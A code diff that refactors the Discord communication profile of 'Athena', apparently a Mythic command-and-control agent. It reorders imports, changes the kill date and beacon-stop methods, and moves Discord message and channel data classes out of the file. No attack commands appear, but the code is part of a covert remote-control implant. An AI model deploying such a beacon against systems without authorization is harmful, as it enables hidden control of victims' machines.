@@ -1,29 +1,23 @@
-﻿using Athena.Utilities;
-using System;
-using System.Net;
-using System.Net.Security;
-using System.Threading.Tasks;
-using System.Collections.Generic;
-using System.Collections.Specialized;
-using System.Linq;
-using System.Net.Http;
-using System.Text;
-using System.Net.Http.Headers;
-using System.IO;
+﻿using Athena.Commands;
 using Athena.Models.Config;
-using System.Text.Json;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
+using Athena.Profiles.Discord.Models;
+using Athena.Utilities;
+
 using System.Diagnostics;
-using Athena.Commands;
+using System.Net;
+using System.Net.Http.Headers;
+using System.Text;
+using System.Text.Json;
 
 namespace Profiles
 {
     public class Discord : IProfile
     {
-        private DateTime killDate { get; set; }
+        public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
         public string uuid { get; set; }
@@ -364,7 +358,7 @@ namespace Profiles
             }
         }
 
-        public async Task<bool> StopBeacon()
+        public bool StopBeacon()
         {
             this.cts.Cancel();
             return true;
@@ -389,98 +383,6 @@ namespace Profiles
             {
                 status = "failed"
             };
-        }
-
-        public class MythicMessageWrapper
-        {
-            public string message { get; set; } = String.Empty;
-            public string sender_id { get; set; } //Who sent the message
-            public bool to_server { get; set; }
-            public int id { get; set; }
-            public bool final { get; set; }
-        }
-
-        //adding Json Classes
-        public class GetServerDetails
-        {
-            public string id { get; set; }
-            public int type { get; set; }
-            public string name { get; set; }
-            public int position { get; set; }
-            public int flags { get; set; }
-            public string parent_id { get; set; }
-            public string guild_id { get; set; }
-            public List<object> permission_overwrites { get; set; }
-            public string last_message_id { get; set; }
-            public object topic { get; set; }
-            public int? rate_limit_per_user { get; set; }
-            public bool? nsfw { get; set; }
-            public int? bitrate { get; set; }
-            public int? user_limit { get; set; }
-            public object rtc_region { get; set; }
-        }
-        public class Author
-        {
-            public string id { get; set; }
-            public string username { get; set; }
-            public object avatar { get; set; }
-            public object avatar_decoration { get; set; }
-            public string discriminator { get; set; }
-            public int public_flags { get; set; }
-            public bool? bot { get; set; }
-        }
-        public class ServerDetails
-        {
-            public string id { get; set; }
-            public int type { get; set; }
-            public string content { get; set; }
-            public string channel_id { get; set; }
-            public Author author { get; set; }
-            public List<Attachment> attachments { get; set; }
-            public List<object> embeds { get; set; }
-            public List<object> mentions { get; set; }
-            public List<object> mention_roles { get; set; }
-            public bool pinned { get; set; }
-            public bool mention_everyone { get; set; }
-            public bool tts { get; set; }
-            public DateTime timestamp { get; set; }
-            public object edited_timestamp { get; set; }
-            public int flags { get; set; }
-            public List<object> components { get; set; }
-            public string webhook_id { get; set; }
-        }
-        public class ChannelResponse
-        {
-            public string id { get; set; }
-            public object last_message_id { get; set; }
-            public int type { get; set; }
-            public string name { get; set; }
-            public int position { get; set; }
-            public int flags { get; set; }
-            public object parent_id { get; set; }
-            public object topic { get; set; }
-            public string guild_id { get; set; }
-            public List<object> permission_overwrites { get; set; }
-            public int rate_limit_per_user { get; set; }
-            public bool nsfw { get; set; }
-        }
-        public class ChannelCreateSend
-        {
-            public string name { get; set; }
-            public int type { get; set; }
-        }
-        public class Attachment
-        {
-            public string id { get; set; }
-            public string filename { get; set; }
-            public string? description { get; set; }
-            public string? content_type { get; set; }
-            public int size { get; set; }
-            public string url { get; set; }
-            public string proxy_url { get; set; }
-            public int? height { get; set; }
-            public int? width { get; set; }
-            public bool? ephemeral { get; set; }
         }
     }
 }
